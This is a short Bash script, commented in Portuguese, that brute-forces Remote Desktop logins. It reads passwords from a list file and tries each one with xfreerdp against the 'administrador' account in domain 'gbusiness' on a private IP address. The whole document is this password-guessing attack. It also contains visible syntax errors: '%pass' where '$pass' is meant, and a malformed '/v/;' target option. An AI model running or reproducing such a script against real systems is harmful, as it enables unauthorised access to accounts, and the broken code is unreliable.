#!/bin/bash
for pass in $(cat lista.txt);
do
echo "Testando senha: %pass"
xfreerdp /u:administrador /d:gbusiness /p:$pass /v/;172.16.1.60 /w:800 /h:600;
done
